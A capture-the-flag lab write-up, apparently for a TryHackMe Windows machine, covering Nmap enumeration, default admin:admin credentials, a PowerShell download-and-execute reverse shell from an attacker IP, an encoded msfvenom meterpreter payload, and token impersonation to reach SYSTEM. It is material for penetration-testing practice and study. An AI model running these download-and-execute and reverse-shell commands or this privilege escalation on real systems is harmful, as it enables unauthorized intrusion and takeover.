#THM #EscaltePriv #Windows #Metasploit

#### Nmap

```bash
nmap 10.10.61.127 -sT -sC -sV

80/tcp   open  http          Microsoft IIS httpd 7.5
   | http-methods: 
   |_  Potentially risky methods: TRACE
   |_http-server-header: Microsoft-IIS/7.5
   |_http-title: Site doesnt have a title (text/html)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
   | ssl-cert: Subject: commonName=alfred
   | Not valid before: 2021-12-12T20:17:32
   |_Not valid after:  2022-06-13T20:17:32
   |_ssl-date: 2021-12-13T20:19:57+00:00; -1s from scanner time
8080/tcp open  http  Jetty 9.4.z-SNAPSHOT
   | http-robots.txt: 1 disallowed entry 
   |_/
   |_http-server-header: Jetty(9.4.z-SNAPSHOT)
   |_http-title: Site doesn't have a title (text/html;charset=utf-8)
MAC Address: 02:6D:7E:93:CC:FB (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
   |_clock-skew: mean: -1s, deviation: 0s, median: -1s

```

#### Enumeration and getting a shell
* Port 80
	* bruce.jpg
	* alfred@wayneeterprises.com
* Port 8080 - Jetty 9.4.z-SNAPSHOT - webserver
	* admin:admin
* webapp makes command execution possible
	* setup http server on 8000
	* setup nc on 8001
	* make app run our command in /project/configure

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.107.123:8000/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.107.123 -Port 8001
```

#### Switching Shells
* Use msfvenom to create the a windows meterpreter reverse shell using the following payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
* upload to server as bevore and execute it
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.107.123:8000/myBear.exe','myBear.exe')"
. .\myBear.exe

msf > use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
meterpreter >
```

#### Privilidge Escalation

* use token impersonation to gain system access
	* Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions
	* Account tokens are assigned to an account when users log in or are authenticated. 
	* This is usually done by LSASS.exe (think of this as an authentication process)
	* This access token consists of:
		* user SIDs(security identifier)
		*  group SIDs
		*  privileges
	* There are two types of access tokens:
		*  primary access tokens: those associated with a user account that are generated on log on
		*  impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
	* For an impersonation token, there are different levels:
		-   SecurityAnonymous: current user/client cannot impersonate another user/client
		-   SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
		-   SecurityImpersonation: current user/clientÂ can impersonate the client's security context on the local system
		-   SecurityDelegation: current user/client can impersonate the client's security context on a remote system
	* The privileges of an account (which are either given to the account when created or inherited from a group) allow a user to carry out particular actions
	* Here are the most commonly abused privileges:
		-   SeImpersonatePrivilege
		-   SeAssignPrimaryPrivilege
		-   SeTcbPrivilege
		-   SeBackupPrivilege
		-   SeRestorePrivilege
		-   SeCreateTokenPrivilege
		-   SeLoadDriverPrivilege
		-   SeTakeOwnershipPrivilege
		-   SeDebugPrivilege
```powershell
whoami /priv

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

* SeDebugPrivilege, SeImpersonatePrivilege are enabled
	* use the incognito module that will allow us to exploit this vulnerability
	* check which tokens are available
```powershell
meterpreter> load incognito
list_tokens -g

- Delegation Tokens Available
========================================

BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

* BUILTIN\\Administrators token is available
```powershell
impersonate_token "BUILTIN\Administrators"

[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

* even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do)
	* migrate to a process with correct permissions
		* the safest process to pick is the services.exe process

```bash
meterpreter > ps | grep services

Filtering on 'services'

Process List
============
 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 668  580   services.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe

meterpreter > migrate 580
[*] Migrating from 2572 to 580...
[*] Migration completed successfully.
```